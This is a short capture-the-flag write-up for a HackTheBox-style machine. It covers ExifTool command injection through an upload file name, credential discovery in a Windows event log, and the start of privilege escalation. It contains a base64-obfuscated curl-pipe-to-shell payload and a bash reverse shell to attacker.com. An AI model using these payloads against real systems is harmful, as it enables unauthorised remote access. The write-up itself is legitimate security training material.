
# Gaining foothold
On `http://eforenzics.htb`, found a foothold to do with an old vulnerable version of Exiftools that allows [[Arbitary command execution]], using the upload file name:

```bash
echo Y3VybCBpcC9yZXZlcnNlc2hlbGwuc2h8c2g|base64 -d|sh |
```
Where `Y3VybCBpcC9yZXZlcnNlc2hlbGwuc2h8c2g` = `curl ip/reverseshell.sh|sh`

Contents of `reverseshell.sh` (from [[GTFO Bins]]):
```bash
export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```

Gained foothold to `www-data`.

# Lateral movement
Using `crontab -l` , notice something interesting in directory, from which I get `Windows Log Event.msg`. I transfer file to localhost using [[nc]], convert it to `eml` file format, then opening it using [[thunderbird]]. Notice an attached zip file which I save and extract. Extracted file is in [[evtx]] format. We notice an event with ID 4625 (**Login Error**) where the `smorton` user incorrectly inputs his password in the username section.

We ssh into `smorton` with the found credentials.

# PrivEsc
Using `sudo -l`:
```bash
Matching Defaults entries for smorton on investigation:
   env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/s. nap/bin

User smorton may run the following commands on investigation:
   (root) NOPASSWD: /usr/bin/binary
```

